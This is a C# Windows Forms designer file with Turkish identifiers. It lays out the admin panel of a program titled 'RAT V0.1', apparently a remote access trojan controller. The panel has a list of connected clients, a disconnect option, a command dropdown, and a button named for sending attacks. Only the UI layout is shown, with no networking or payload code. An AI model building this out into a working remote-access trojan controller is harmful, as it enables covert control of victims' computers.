namespace adminpanel
{
    partial class YonetimPaneli
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            clientlb = new ListBox();
            clientmenu = new ContextMenuStrip(components);
            bağlantıyıKesToolStripMenuItem = new ToolStripMenuItem();
            komutcb = new ComboBox();
            mesajtb = new TextBox();
            saldırısendbtn = new Button();
            logtb = new TextBox();
            kptbtn = new Button();
            ustpnl = new Panel();
            kucultbtn = new Button();
            clientmenu.SuspendLayout();
            SuspendLayout();
            // 
            // clientlb
            // 
            clientlb.BackColor = Color.FromArgb(18, 18, 18);
            clientlb.ContextMenuStrip = clientmenu;
            clientlb.Font = new Font("Consolas", 10.8F, FontStyle.Bold, GraphicsUnit.Point, 162);
            clientlb.ForeColor = Color.Red;
            clientlb.FormattingEnabled = true;
            clientlb.ItemHeight = 22;
            clientlb.Location = new Point(0, 36);
            clientlb.Margin = new Padding(4, 3, 4, 3);
            clientlb.Name = "clientlb";
            clientlb.Size = new Size(899, 70);
            clientlb.TabIndex = 0;
            // 
            // clientmenu
            // 
            clientmenu.ImageScalingSize = new Size(20, 20);
            clientmenu.Items.AddRange(new ToolStripItem[] { bağlantıyıKesToolStripMenuItem });
            clientmenu.Name = "clientmenu";
            clientmenu.Size = new Size(170, 28);
            // 
            // bağlantıyıKesToolStripMenuItem
            // 
            bağlantıyıKesToolStripMenuItem.Name = "bağlantıyıKesToolStripMenuItem";
            bağlantıyıKesToolStripMenuItem.Size = new Size(169, 24);
            bağlantıyıKesToolStripMenuItem.Text = "Bağlantıyı kes";
            bağlantıyıKesToolStripMenuItem.Click += bağlantıyıKesToolStripMenuItem_Click_1;
            // 
            // komutcb
            // 
            komutcb.BackColor = Color.FromArgb(18, 18, 18);
            komutcb.DropDownStyle = ComboBoxStyle.DropDownList;
            komutcb.Font = new Font("Consolas", 12F, FontStyle.Bold, GraphicsUnit.Point, 162);
            komutcb.ForeColor = Color.Lime;
            komutcb.FormattingEnabled = true;
            komutcb.Location = new Point(66, 156);
            komutcb.Margin = new Padding(4, 3, 4, 3);
            komutcb.Name = "komutcb";
            komutcb.Size = new Size(188, 31);
            komutcb.TabIndex = 1;
            // 
            // mesajtb
            // 
            mesajtb.BackColor = Color.FromArgb(64, 68, 75);
            mesajtb.BorderStyle = BorderStyle.None;
            mesajtb.Cursor = Cursors.IBeam;
            mesajtb.ForeColor = SystemColors.MenuBar;
            mesajtb.Location = new Point(415, 162);
            mesajtb.Margin = new Padding(4, 3, 4, 3);
            mesajtb.Name = "mesajtb";
            mesajtb.PlaceholderText = "veri girişi...";
            mesajtb.Size = new Size(332, 20);
            mesajtb.TabIndex = 2;
            // 
            // saldırısendbtn
            // 
            saldırısendbtn.BackColor = Color.FromArgb(18, 18, 18);
            saldırısendbtn.Cursor = Cursors.Hand;
            saldırısendbtn.FlatStyle = FlatStyle.Popup;
            saldırısendbtn.Font = new Font("Consolas", 12F, FontStyle.Bold, GraphicsUnit.Point, 162);
            saldırısendbtn.ForeColor = Color.Lime;
            saldırısendbtn.Location = new Point(299, 233);
            saldırısendbtn.Margin = new Padding(4, 3, 4, 3);
            saldırısendbtn.Name = "saldırısendbtn";
            saldırısendbtn.Size = new Size(252, 37);
            saldırısendbtn.TabIndex = 3;
            saldırısendbtn.Text = "Gönder";
            saldırısendbtn.UseVisualStyleBackColor = false;
            saldırısendbtn.Click += saldırısendbtn_Click;
            saldırısendbtn.MouseEnter += saldırısendbtn_MouseEnter;
            saldırısendbtn.MouseLeave += saldırısendbtn_MouseLeave;
            // 
            // logtb
            // 
            logtb.BackColor = Color.FromArgb(18, 18, 18);
            logtb.BorderStyle = BorderStyle.None;
            logtb.ForeColor = Color.Lime;
            logtb.Location = new Point(0, 276);
            logtb.Margin = new Padding(4, 3, 4, 3);
            logtb.Multiline = true;
            logtb.Name = "logtb";
            logtb.ReadOnly = true;
            logtb.ScrollBars = ScrollBars.Vertical;
            logtb.Size = new Size(883, 141);
            logtb.TabIndex = 4;
            // 
            // kptbtn
            // 
            kptbtn.FlatStyle = FlatStyle.Popup;
            kptbtn.ForeColor = Color.Red;
            kptbtn.Location = new Point(882, 1);
            kptbtn.Name = "kptbtn";
            kptbtn.Size = new Size(17, 29);
            kptbtn.TabIndex = 5;
            kptbtn.Text = "X";
            kptbtn.UseVisualStyleBackColor = true;
            kptbtn.Click += kptbtn_Click;
            // 
            // ustpnl
            // 
            ustpnl.Location = new Point(2, 1);
            ustpnl.Name = "ustpnl";
            ustpnl.Size = new Size(853, 36);
            ustpnl.TabIndex = 6;
            // 
            // kucultbtn
            // 
            kucultbtn.FlatStyle = FlatStyle.Popup;
            kucultbtn.ForeColor = Color.Lime;
            kucultbtn.Location = new Point(854, 1);
            kucultbtn.Name = "kucultbtn";
            kucultbtn.Size = new Size(22, 29);
            kucultbtn.TabIndex = 7;
            kucultbtn.Text = "-";
            kucultbtn.UseVisualStyleBackColor = true;
            kucultbtn.Click += kucultbtn_Click;
            // 
            // YonetimPaneli
            // 
            AutoScaleDimensions = new SizeF(10F, 19F);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.FromArgb(18, 18, 18);
            ClientSize = new Size(899, 428);
            Controls.Add(kucultbtn);
            Controls.Add(ustpnl);
            Controls.Add(kptbtn);
            Controls.Add(logtb);
            Controls.Add(saldırısendbtn);
            Controls.Add(mesajtb);
            Controls.Add(komutcb);
            Controls.Add(clientlb);
            Font = new Font("Arial", 10.2F, FontStyle.Bold, GraphicsUnit.Point, 162);
            ForeColor = SystemColors.ControlLight;
            FormBorderStyle = FormBorderStyle.None;
            Margin = new Padding(4, 3, 4, 3);
            Name = "YonetimPaneli";
            Text = "RAT V0.1 - Yönetim Paneli";
            Load += YonetimPaneli_Load;
            clientmenu.ResumeLayout(false);
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private ListBox clientlb;
        private ComboBox komutcb;
        private TextBox mesajtb;
        private Button saldırısendbtn;
        private TextBox logtb;
        private ContextMenuStrip clientmenu;
        private ToolStripMenuItem bağlantıyıKesToolStripMenuItem;
        private Button kptbtn;
        private Panel ustpnl;
        private Button kucultbtn;
    }
}